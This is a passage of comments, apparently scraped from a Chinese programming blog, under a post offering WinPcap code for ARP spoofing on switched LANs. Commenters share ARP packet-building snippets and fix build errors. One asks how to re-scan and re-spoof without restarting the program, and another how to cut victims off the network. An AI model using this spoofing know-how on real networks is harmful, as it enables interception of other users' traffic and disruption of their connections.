+						<a title="permalink: 发送包函数的问题" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#13841">#</a>&nbsp;<a name="13841"></a>发送包函数的问题
+						<span>
+								2006-10-18 23:00
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl26_NameLink" target="_blank">汪洋小虾米</a>
+					</div>
+					<div class="postText">
+						伪造<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>包以后,系统是怎样根据源mac地址,和目的mac地址发送包的,我的意思for(k=0;k&lt;6;k++)
+<br>    {
+<br>        eth.eh_dst[k]=0xff;
+<br>        eth.eh_src[k]=myip-&gt;mac[k];
+<br>        <b style="color: black; background-color: rgb(255, 255, 102);">arp</b>.<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>_sha[k]=myip-&gt;mac[k];
+<br>        <b style="color: black; background-color: rgb(255, 255, 102);">arp</b>.<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>_tha[k]=0x00;
+<br>    }
+<br>    eth.eh_type=htons(ETH_<b style="color: black; background-color: rgb(255, 255, 102);">ARP</b>);
+<br>    <b style="color: black; background-color: rgb(255, 255, 102);">arp</b>.<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>_hdr=htons(<b style="color: black; background-color: rgb(255, 255, 102);">ARP</b>_HARDWARE);
+<br>    <b style="color: black; background-color: rgb(255, 255, 102);">arp</b>.<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>_pro=htons(ETH_IP);
+<br>    <b style="color: black; background-color: rgb(255, 255, 102);">arp</b>.<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>_hln=6;
+<br>    <b style="color: black; background-color: rgb(255, 255, 102);">arp</b>.<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>_pln=4;
+<br>    <b style="color: black; background-color: rgb(255, 255, 102);">arp</b>.<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>_opt=htons(<b style="color: black; background-color: rgb(255, 255, 102);">ARP</b>_REQUEST);
+<br>	<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>.<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>_spa=myip-&gt;ip;
+<br>以上代码可以换成以下代码吗?
+<br> eth.eh_type=htons(ETH_<b style="color: black; background-color: rgb(255, 255, 102);">ARP</b>);
+<br>    <b style="color: black; background-color: rgb(255, 255, 102);">arp</b>.<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>_hdr=htons(<b style="color: black; background-color: rgb(255, 255, 102);">ARP</b>_HARDWARE);
+<br>    <b style="color: black; background-color: rgb(255, 255, 102);">arp</b>.<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>_pro=htons(ETH_IP);
+<br>    <b style="color: black; background-color: rgb(255, 255, 102);">arp</b>.<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>_hln=6;
+<br>    <b style="color: black; background-color: rgb(255, 255, 102);">arp</b>.<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>_pln=4;
+<br>    <b style="color: black; background-color: rgb(255, 255, 102);">arp</b>.<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>_opt=htons(<b style="color: black; background-color: rgb(255, 255, 102);">ARP</b>_REQUEST);
+<br>	<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>.<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>_spa=myip-&gt;ip;
+<br>for(k=0;k&lt;6;k++)
+<br>    {
+<br>        eth.eh_dst[k]=0xff;
+<br>        eth.eh_src[k]=myip-&gt;mac[k];
+<br>        <b style="color: black; background-color: rgb(255, 255, 102);">arp</b>.<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>_sha[k]=myip-&gt;mac[k];
+<br>        <b style="color: black; background-color: rgb(255, 255, 102);">arp</b>.<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>_tha[k]=0x00;
+<br>    }
+<br>两段代码只不过交换了顺序,我的问题是系统是怎样根据源mac地址,和目的mac地址发送包的,源mac地址和目的mac地址不是都是字符型的吗?系统怎样识别的
+<br>?&nbsp;&nbsp;<a onclick='return SetReplyAuhor("汪洋小虾米")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=%e6%b1%aa%e6%b4%8b%e5%b0%8f%e8%99%be%e7%b1%b3" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl26_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl26$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl26_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#14035">#</a>&nbsp;<a name="14035"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2006-10-23 11:28
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl27_NameLink" href="http://www.cppblog.com/saga/" target="_top">saga.constantine</a>
+					</div>
+					<div class="postText">
+						上面的这段代码应该是可以交换的。因为两段代码改变的变量是不一样的。
+<br>源mac地址和目的mac地址设置是字符类型但是对他的赋值都是像
+<br>      eth.eh_dst[k]=0xff;
+<br>        eth.eh_src[k]=0x0f;
+<br>        <b style="color: black; background-color: rgb(255, 255, 102);">arp</b>.<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>_sha[k]=0x0f;
+<br>        <b style="color: black; background-color: rgb(255, 255, 102);">arp</b>.<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>_tha[k]=0x00;
+<br>这样的，设置成字符是因为char的长度是一个字节。在构造包的时候用memcpy()函数进行内存拷贝就行了，而并不需要在意拷贝源地址定义的是什么类型。
+<br>
+<br>我的自己看法，仅供参考！！：）
+<br>
+<br>我现在上博客不多，要交流问题可以加我QQ:34085905.愿意广交朋友。&nbsp;&nbsp;<a onclick='return SetReplyAuhor("saga.constantine")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=saga.constantine" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl27_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl27$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl27_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#16322">#</a>&nbsp;<a name="16322"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2006-12-12 16:05
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl28_NameLink" target="_blank">赵</a>
+					</div>
+					<div class="postText">
+						我的程序在屏幕输出 PacketSend succeed 就不往下走了，也就是说，程序或取不到自己网卡的mac值 郁闷中，如果谁能有解决这个问题的答案可以加我得QQ378079178&nbsp;&nbsp;<a onclick='return SetReplyAuhor("赵")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=%e8%b5%b5" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl28_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl28$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl28_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#22028">#</a>&nbsp;<a name="22028"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2007-04-16 17:13
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl29_NameLink" target="_blank">nellson</a>
+					</div>
+					<div class="postText">
+						   saga,你好，我在连接的时候显示：
+<br>  LINK : fatal error LNK1104: cannot open file "pcap.lib"
+<br>   但在网上搜不到pcap.lib请问如何解决，其它配置我已经按上面的说法配置好了，谢谢，我的QQ：30481895&nbsp;&nbsp;<a onclick='return SetReplyAuhor("nellson")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=nellson" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl29_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl29$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl29_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#22144">#</a>&nbsp;<a name="22144"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2007-04-17 17:32
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl30_NameLink" target="_blank">Nellson</a>
+					</div>
+					<div class="postText">
+						    通过了，把pcap 改为 wpcap即#pragma comment(lib,"wpcap")即可，
+<br>code generator中设为Multithreaded, 2Bytes,Blend* _cdecl*, Link中加上wsock32.lib ws2_32.lib wpcap.lib即可。&nbsp;&nbsp;<a onclick='return SetReplyAuhor("Nellson")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=Nellson" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl30_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl30$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl30_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#23024">#</a>&nbsp;<a name="23024"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2007-04-27 11:43
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl31_NameLink" target="_blank">saga</a>
+					</div>
+					<div class="postText">
+						Nellson可能是我编的时候的小错误，不好意思  -----saga&nbsp;&nbsp;<a onclick='return SetReplyAuhor("saga")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=saga" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl31_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl31$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl31_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#23229">#</a>&nbsp;<a name="23229"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2007-04-30 10:48
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl32_NameLink" target="_blank">jtg5</a>
+					</div>
+					<div class="postText">
+						c:\program files\microsoft visual studio\vc98\include\ipexport.h(39) : error C2371: 'IN6_ADDR' : redefinition; different basic types
+<br>        c:\program files\microsoft visual studio\vc98\include\ws2tcpip.h(68) : see declaration of 'IN6_ADDR'
+<br>
+<br>你好，我编译了你的程序，出现上面2个错误，我上网搜了一下，说是你手工定义了那个结构。我想问一下这是怎么回事？谢谢！&nbsp;&nbsp;<a onclick='return SetReplyAuhor("jtg5")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=jtg5" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl32_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl32$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl32_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#23578">#</a>&nbsp;<a name="23578"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2007-05-07 19:59
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl33_NameLink" href="http://www.cppblog.com/saga/" target="_top">saga.constantine</a>
+					</div>
+					<div class="postText">
+						你改过代码吗？？？我没有见过这个错误
+<br>@jtg5
+<br>&nbsp;&nbsp;<a onclick='return SetReplyAuhor("saga.constantine")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=saga.constantine" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl33_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl33$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl33_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#24020">#</a>&nbsp;<a name="24020"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2007-05-13 10:28
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl34_NameLink" target="_blank">calen3</a>
+					</div>
+					<div class="postText">
+						楼主能把修改过的重新发布一下吗?
+<br>在编译的时候出现很多错误~~&nbsp;&nbsp;<a onclick='return SetReplyAuhor("calen3")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=calen3" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl34_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl34$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl34_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#24043">#</a>&nbsp;<a name="24043"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2007-05-13 16:25
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl35_NameLink" target="_blank">guava</a>
+					</div>
+					<div class="postText">
+						我也出现下列问题：
+<br>c:\program files\microsoft visual studio\vc98\include\ipexport.h(39) : error C2371: 'IN6_ADDR' : redefinition; different basic types 
+<br>c:\program files\microsoft visual studio\vc98\include\ws2tcpip.h(68) : see declaration of 'IN6_ADDR' 
+<br>
+<br>
+<br>ipexport.h里面也说明了不要和w2stcpip.h同时用。下面是来自ipexport.h里的说明：
+<br>//
+<br>// Duplicate these definitions here so that this file can be included by
+<br>// kernel-mode components which cannot include ws2tcpip.h, as well as
+<br>// by user-mode components which do.
+<br>//&nbsp;&nbsp;<a onclick='return SetReplyAuhor("guava")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=guava" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl35_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl35$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl35_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#24375">#</a>&nbsp;<a name="24375"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2007-05-19 10:51
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl36_NameLink" target="_blank">saga</a>
+					</div>
+					<div class="postText">
+						@calen3
+<br>我发的那个很多人都编译出来可啊
+<br>应该没有问题啊
+<br>只是库和设置的问题啊
+<br>
+<br>&nbsp;&nbsp;<a onclick='return SetReplyAuhor("saga")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=saga" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl36_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl36$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl36_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#24376">#</a>&nbsp;<a name="24376"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2007-05-19 10:53
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl37_NameLink" target="_blank">saga</a>
+					</div>
+					<div class="postText">
+						这个问题 我还真的不知道是怎么回事
+<br>程序编的时间比较久了
+<br>关键是我没有遇到过这样的情况
+<br>所以不知道怎么去帮你们解答
+<br>@guava
+<br>&nbsp;&nbsp;<a onclick='return SetReplyAuhor("saga")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=saga" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl37_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl37$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl37_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#24701">#</a>&nbsp;<a name="24701"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2007-05-23 17:48
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl38_NameLink" target="_blank">雪狼</a>
+					</div>
+					<div class="postText">
+						link1104:cannot open files pcap.lib   大家看出现这个问题怎么回事啊?&nbsp;&nbsp;<a onclick='return SetReplyAuhor("雪狼")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=%e9%9b%aa%e7%8b%bc" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl38_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl38$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl38_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#24702">#</a>&nbsp;<a name="24702"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2007-05-23 17:50
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl39_NameLink" target="_blank">雪狼</a>
+					</div>
+					<div class="postText">
+						pacp_next_ex:undeclared identifier   大家看出现这个问题怎么回事啊?&nbsp;&nbsp;<a onclick='return SetReplyAuhor("雪狼")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=%e9%9b%aa%e7%8b%bc" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl39_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl39$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl39_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#24863">#</a>&nbsp;<a name="24863"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2007-05-26 00:16
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl40_NameLink" target="_blank">guava</a>
+					</div>
+					<div class="postText">
+						编译通过了，先贴出解决的代码
+<br>#include &lt;stdlib.h&gt;
+<br>#include &lt;stdio.h&gt;
+<br>#define _WSPIAPI_COUNTOF
+<br>#include &lt;winsock2.h&gt;
+<br>#include &lt;pcap.h&gt;                 //winpcap的头文件
+<br>#include &lt;process.h&gt;              //多线程编程的头文件
+<br>#include &lt;windows.h&gt;
+<br>#include &lt;Iphlpapi.h&gt;             //提取网关用的头文件
+<br>
+<br>
+<br>
+<br>&nbsp;&nbsp;<a onclick='return SetReplyAuhor("guava")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=guava" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl40_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl40$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl40_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#24875">#</a>&nbsp;<a name="24875"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2007-05-26 09:04
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl41_NameLink" target="_blank">雪狼</a>
+					</div>
+					<div class="postText">
+						哈,终于可以运行了 
+<br>但是怎样能在不退出程序的情况下,再重新<b style="color: black; background-color: rgb(160, 255, 255);">扫描</b>和欺骗,还要在程序里怎么改一下?
+<br>还有在连在HUB的局域网内怎么打开程序进行欺骗时,别的电脑还能收到数据,但我一关闭程序它们又收不到数据了?百思不得其解 &nbsp;&nbsp;<a onclick='return SetReplyAuhor("雪狼")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=%e9%9b%aa%e7%8b%bc" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl41_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl41$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl41_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#24927">#</a>&nbsp;<a name="24927"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2007-05-27 11:42
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl42_NameLink" target="_blank">saga</a>
+					</div>
+					<div class="postText">
+						我也看不懂你的几个头，解释详细点可以吗？谢@guava
+<br>&nbsp;&nbsp;<a onclick='return SetReplyAuhor("saga")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=saga" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl42_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl42$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl42_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#24928">#</a>&nbsp;<a name="24928"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2007-05-27 11:49
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl43_NameLink" target="_blank">saga</a>
+					</div>
+					<div class="postText">
+						这个应该不难啊！加个输入控制，比如输入rescan就在次进行<b style="color: black; background-color: rgb(160, 255, 255);">扫描</b>。把代码在组织一下就可以了，后面一个问题我也遇到过，情况不太一样，就是结束欺骗后不能马上结束程序，不然交换网中被欺骗机器会出现短时上不了网的情况。你可以再研究一下，雪狼！@雪狼
+<br>&nbsp;&nbsp;<a onclick='return SetReplyAuhor("saga")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=saga" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl43_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl43$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl43_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#24977">#</a>&nbsp;<a name="24977"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2007-05-28 15:46
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl44_NameLink" target="_blank">雪狼</a>
+					</div>
+					<div class="postText">
+						那怎样才能使运行程序时,让被欺骗机器出现上不了网?&nbsp;&nbsp;<a onclick='return SetReplyAuhor("雪狼")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=%e9%9b%aa%e7%8b%bc" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl44_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl44$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl44_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#25046">#</a>&nbsp;<a name="25046"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2007-05-29 11:14
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl45_NameLink" target="_blank">雪狼</a>
+					</div>
+					<div class="postText">
+						晚上我改了改不行啊，那个转发线程怎样停止啊？
